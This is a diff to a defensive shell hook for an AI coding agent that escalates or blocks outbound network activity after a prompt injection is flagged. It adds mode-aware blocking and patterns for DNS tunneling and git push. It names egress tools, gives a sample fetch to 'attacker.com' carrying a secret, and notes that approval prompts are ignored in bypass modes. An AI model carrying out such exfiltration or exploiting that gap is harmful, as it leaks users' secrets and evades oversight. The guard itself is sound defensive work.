@@ -2,10 +2,13 @@
 # PreToolUse hook: Layer 6 — Outbound Exfiltration Guard.
 #
 # When a HIGH-severity prompt-injection was flagged in THIS session within the
-# last SESSION_WINDOW seconds, escalate OUTBOUND activity to a user confirmation
-# (permissionDecision:"ask"). This breaks the inject->exfil chain: an injected
-# instruction cannot self-approve egress; a human decides. Two channels:
-#   - Bash:       network-egress commands (curl/wget/scp/ssh/.../inline net one-liners)
+# last SESSION_WINDOW seconds, escalate OUTBOUND activity. The escalation is
+# MODE-AWARE (see emit_guard): permissionDecision:"ask" in modes that surface an
+# interactive prompt, a hard {decision:"block"} in modes that discard "ask"
+# (bypassPermissions/auto/dontAsk). This breaks the inject->exfil chain: an
+# injected instruction cannot self-approve egress. Two channels:
+#   - Bash:       network-egress commands (curl/wget/scp/ssh/.../inline net
+#                 one-liners, plus DNS tunneling via dig/nslookup and git push)
 #   - web-fetch:  a fetch to a NON-allowlisted host — the most natural exfil vector
 #                 after an injection (e.g. WebFetch attacker.com/?data=<secret>).
 #
@@ -28,6 +31,10 @@ INPUT=$(cat)
 TOOL_NAME=$(printf '%s' "$INPUT" | jq -r '.tool_name // ""' 2>/dev/null)
 COMMAND=$(printf '%s' "$INPUT" | jq -r '.tool_input.command // ""' 2>/dev/null)
 WF_URL=$(printf '%s' "$INPUT" | jq -r '.tool_input.url // .tool_input.URL // .tool_input.uri // .tool_input.href // (.tool_input.urls // [])[0] // ""' 2>/dev/null)
+# Active permission mode (default|plan|acceptEdits|auto|dontAsk|bypassPermissions).
+# Drives mode-aware enforcement in emit_guard — see that function. Empty on an
+# older harness that omits the field → treated as ask-honoring (no regression).
+PERM_MODE=$(printf '%s' "$INPUT" | jq -r '.permission_mode // ""' 2>/dev/null)
 # A Bash call with no command has nothing to inspect → defer. A non-Bash
 # (web-fetch-matched) tool is NOT exited here even if its target is unparsable:
 # when armed it must fail closed to ASK (a fetch tool whose destination we can't
@@ -69,8 +76,21 @@ host_allowlisted() {
   host_in_list "$1" "$ALLOWLIST"
 }
 
-# emit_ask <reason> <log-tag> <log-detail> — log + notify + emit ASK json, exit 0.
-emit_ask() {
+# emit_guard <reason> <log-tag> <log-detail> — log + notify + emit a MODE-AWARE
+# enforcement decision, exit 0.
+#
+# Why mode-aware: a hook's permissionDecision:"ask" is only effective in modes
+# that actually surface an interactive prompt. In bypassPermissions/auto/dontAsk
+# the harness discards the "ask" and runs the tool anyway, so the guard would be
+# silently inert (verified empirically). In those modes the ONLY enforcement the
+# harness honors is a hard block, emitted via the legacy {decision:"block"} form
+# (the same mechanism the URL pre-screen uses, confirmed honored under bypass) —
+# NOT permissionDecision:"deny", which bypass mode also discards.
+#   ask-honoring modes (default/acceptEdits/plan, or empty on an older harness)
+#     → permissionDecision:"ask" (a human decides; original behavior preserved)
+#   ask-ignoring modes (bypassPermissions/auto/dontAsk)
+#     → {decision:"block"} (escape via url-allowlist.txt or the kill switch)
+emit_guard() {
   local reason="$1" tag="$2" detail safe
   detail="$3"
   mkdir -p "$CONFIG_DIR" 2>/dev/null
@@ -79,13 +99,18 @@ emit_ask() {
   echo "[$(date '+%Y-%m-%d %H:%M:%S')] [${tag}] session=${SESSION_ID} ${safe}" >> "$LOG_FILE" 2>/dev/null
   # Cross-platform notify (dispatcher applies the per-platform metachar escaping).
   notify_dispatch "MEDIUM" "🛡️ Exfiltration Guard" "$safe" "Outbound activity after flagged injection" "Sosumi"
-  jq -n --arg r "$reason" '{
-    hookSpecificOutput: {
-      hookEventName: "PreToolUse",
-      permissionDecision: "ask",
-      permissionDecisionReason: $r
-    }
-  }'
+  case "$PERM_MODE" in
+    bypassPermissions|auto|dontAsk)
+      jq -n --arg r "$reason" '{decision: "block", reason: $r}' ;;
+    *)
+      jq -n --arg r "$reason" '{
+        hookSpecificOutput: {
+          hookEventName: "PreToolUse",
+          permissionDecision: "ask",
+          permissionDecisionReason: $r
+        }
+      }' ;;
+  esac
   exit 0
 }
 
@@ -111,7 +136,7 @@ if [ "$TOOL_NAME" != "Bash" ] && [ -z "$COMMAND" ]; then
   if [ -n "$WF_HOST" ] && [ "$WF_HOST" != "ws-invalid-authority" ] && host_allowlisted "$WF_HOST"; then
     exit 0
   fi
-  emit_ask "⚠️ Outbound fetch after a HIGH-severity prompt-injection was flagged in this session within the last 5 minutes, to a destination that is not on the trusted allowlist. This may be an exfiltration attempt directed by injected web content. Approve only if YOU initiated this fetch." \
+  emit_guard "⚠️ Outbound fetch after a HIGH-severity prompt-injection was flagged in this session within the last 5 minutes, to a destination that is not on the trusted allowlist. This may be an exfiltration attempt directed by injected web content. Approve only if YOU initiated this fetch." \
     "EGRESS-ASK-FETCH" "tool=${TOOL_NAME} url=${WF_URL:-<unparsed>}"
 fi
 
@@ -140,9 +165,23 @@ DEVNET_RE='/dev/(tcp|udp)/'
 # rsync is egress ONLY with a remote spec (host:path / user@host:path); a purely
 # local `rsync /tmp/a /tmp/b` is not exfil (#11b).
 RSYNC_REMOTE_RE='(^|[^a-zA-Z0-9_.])rsync([[:space:]]).*[A-Za-z0-9._-]:'
+# DNS exfil/tunneling: data encoded in subdomain labels then resolved, read back
+# from the attacker's authoritative-NS query log — bypasses every HTTP-shaped
+# check above. `host` is intentionally EXCLUDED (too common a token → FP),
+# matching EGRESS_RE's existing omission. A DNS command carries no ://-host, so
+# host extraction below finds nothing and it always escalates while armed.
+DNS_RE='(^|[^a-zA-Z0-9_.])(dig|nslookup|drill|kdig)([^a-zA-Z0-9_./-]|$)'
+# git push to a remote ships repo contents (incl. secrets) out. The optional
+# global-option group allows `git -c k=v push` / `git -C path push` (an option
+# may take one separate-token value) while NOT matching `git commit -m "push…"`
+# (subcommand is not push) or `git pull`. An explicit push URL/`user@host:` is
+# still host-extracted below, so a push to an allowlisted remote stays exempt.
+GIT_PUSH_RE='(^|[^a-zA-Z0-9_.])git([[:space:]]+-{1,2}[A-Za-z][^[:space:]]*([[:space:]]+[^-[:space:]][^[:space:]]*)?)*[[:space:]]+push([[:space:]]|$)'
 
 IS_EGRESS=0
 printf '%s' "$COMMAND" | grep -qEi "$EGRESS_RE"       && IS_EGRESS=1
+printf '%s' "$COMMAND" | grep -qEi "$DNS_RE"          && IS_EGRESS=1
+printf '%s' "$COMMAND" | grep -qEi "$GIT_PUSH_RE"     && IS_EGRESS=1
 printf '%s' "$COMMAND" | grep -qEi "$HTTPIE_RE"       && IS_EGRESS=1
 printf '%s' "$COMMAND" | grep -qEi "$OPENSSL_RE"      && IS_EGRESS=1
 printf '%s' "$COMMAND" | grep -qE  "$DEVNET_RE"       && IS_EGRESS=1
@@ -180,5 +219,5 @@ fi
 [ "$EXEMPT" = "1" ] && exit 0
 
 # Step 4 — armed + egress → ASK
-emit_ask "⚠️ Outbound network command issued after a HIGH-severity prompt-injection was flagged in this session within the last 5 minutes. This may be an exfiltration attempt directed by injected web content. Approve only if YOU initiated this request." \
+emit_guard "⚠️ Outbound network command issued after a HIGH-severity prompt-injection was flagged in this session within the last 5 minutes. This may be an exfiltration attempt directed by injected web content. Approve only if YOU initiated this request." \
   "EGRESS-ASK" "cmd=\"$(printf '%s' "$COMMAND" | tr -d '\n' | cut -c1-200)\""
